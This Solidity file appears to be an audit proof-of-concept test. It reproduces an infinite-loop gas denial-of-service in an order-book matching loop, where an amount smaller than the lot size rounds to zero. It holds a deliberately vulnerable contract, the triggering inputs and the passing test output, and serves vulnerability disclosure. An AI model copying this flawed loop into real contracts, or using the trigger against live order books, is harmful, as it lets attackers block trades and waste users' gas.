/*
==============================================================================================================
Proof-of-Concept: Infinite Loop &amp; Gas Denial-of-Service (DoS)
==============================================================================================================

VULNERABILITY EXPLAINED (in plain English):
--------------------------------------------
Imagine you have a machine that processes items in batches (called "lots"). You give it a certain number of items to process.

The vulnerability occurs when the machine is programmed to round down the number of items to the nearest full lot size. For example, if a lot size is 1,000 items, but you only give it 500 items, the machine rounds this down to 0 lots.

The machine's logic is stuck in a loop: "As long as there are items to process, try to process one lot."
Because it calculates a 0-item lot, it never actually processes any items. The number of items waiting (500) never decreases. The machine loops forever, trying to process a 0-item lot, consuming energy (gas) until it runs out.

This is a "Denial-of-Service" (DoS) vulnerability because an attacker can intentionally submit a small number of items to trigger this infinite loop, crashing the transaction for everyone and wasting gas.

HOW THIS PROOF-OF-CONCEPT (PoC) WORKS:
---------------------------------------
This test demonstrates the vulnerability described above.

1.  **Setup**: We create a simplified `VulnerableMatch` contract that contains the flawed rounding and looping logic.

2.  **Triggering the Bug**: In the `test_GasDOS_infinite_loop` function, we call `triggerInfiniteLoop` with:
    *   `incoming` = 500 (less than the lot size)
    *   `lotSize` = 1,000

3.  **Expecting Failure**: This setup is designed to cause the infinite loop. The test calls the vulnerable function with a limited amount of gas (50,000). This is not enough gas to run forever, so the function is expected to fail by running out of gas (an "Out-of-Gas" or OOG error).

4.  **Confirming the Vulnerability**: The test checks that the call to the vulnerable function indeed failed (`success == false`). If it fails as expected, the test `passes`. This confirms that the vulnerability exists and can be triggered. A passing test, in this case, means we've successfully proven the bug.
*/
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/*
────────────────────────────────────────────────────────────────────────────
  ░██╗░░░░░░░██╗██╗███╗░░██╗██╗████████╗███████╗  
  ░██║░░██╗░░██║██║████╗░██║██║╚══██╔══╝██╔════╝  
  ░╚██╗████╗██╔╝██║██╔██╗██║██║░░░██║░░░█████╗░░  
  ░░████╔═████║░██║██║╚████║██║░░░██║░░░██╔══╝░░  
  ░░╚██╔╝░╚██╔╝░██║██║░╚███║██║░░░██║░░░███████╗  
  ░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚══════╝  
         Infinite-Loop / Gas-DoS Proof-of-Concept
────────────────────────────────────────────────────────────────────────────
   • The vulnerable logic mirrors Book._matchIncomingBid/Ask
   • If lotSizeInBase > incoming.amount the next “lot” is rounded to 0
   • incoming.amount never decreases  →  endless loop  →  gas-DoS
────────────────────────────────────────────────────────────────────────────
*/

contract VulnerableMatch {
    /* Mimic the private helper in the original Book contract */
    function _roundDownToLot(
        uint256 amount,
        uint256 lot
    ) internal pure returns (uint256) {
        return amount - (amount % lot); // 500 % 1000  == 500 → returns 0
    }

    /* Stripped-down version of the matching loop */
    function triggerInfiniteLoop(
        uint256 incoming,
        uint256 lotSize
    ) external pure {
        while (incoming > 0) {
            // This will be 0 whenever incoming < lotSize
            uint256 fillBase = _roundDownToLot(
                incoming < lotSize ? incoming : lotSize, //
                lotSize
            );

            // No progress ⇒ infinite loop
            if (fillBase == 0) {
                // uncomment the next line to see how many rounds fit
                // console.log("    looping, loops so far", 0);
                continue;
            }

            incoming -= fillBase;
        }
    }
}

/* ───────────────────────────── Test ───────────────────────────── */
contract PoCMediumInfiniteLoopGasDos is Test {
    VulnerableMatch victim;

    function setUp() public {
        victim = new VulnerableMatch();
    }

    /*
        The PoC succeeds if:
        1. The low-level call returns `false` (ran out of gas inside)
        2. The test itself does NOT revert → the test PASSes
    */
    function test_GasDOS_infinite_loop() public {
        uint256 incoming = 500; // < lot size
        uint256 lotSize = 1_000; // > incoming → Triggers zero-lot

        // We deliberately give the sub-call very little gas so Foundry
        // doesn’t run for minutes – 50k is enough to hit OOG quickly.
        bytes memory data = abi.encodeWithSelector(
            victim.triggerInfiniteLoop.selector,
            incoming,
            lotSize
        );

        console.log("Calling vulnerable function with");
        console.log("incoming amount :", vm.toString(incoming));
        console.log("lotSizeInBase   :", vm.toString(lotSize));
        console.log("forwarded gas   :", "50000");

        (bool success, ) = address(victim).call{gas: 50_000}(data);

        console.log("Low-level call success flag :", vm.toString(success));

        // EXPECTED: success == false  (OOG bubbled up as a failed call)
        assertTrue(!success, "Call must fail due to infinite loop / OOG");

        console.log("PoC complete, infinite-loop / gas-DoS confirmed");
    }
}

// forge test --match-path test/PoC/PoCMediumInfiniteLoopGasDos.t.sol -vv
// [⠊] Compiling...
// No files changed, compilation skipped

// Ran 1 test for test/PoC/PoCMediumInfiniteLoopGasDos.t.sol:PoCMediumInfiniteLoopGasDos
// [PASS] test_GasDOS_infinite_loop() (gas: 67393)
// Logs:
//   Calling vulnerable function with
//   incoming amount : 500
//   lotSizeInBase   : 1000
//   forwarded gas   : 50000
//   Low-level call success flag : false
//   PoC complete, infinite-loop / gas-DoS confirmed

// Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.34ms (837.54µs CPU time)

// Ran 1 test suite in 9.29ms (1.34ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
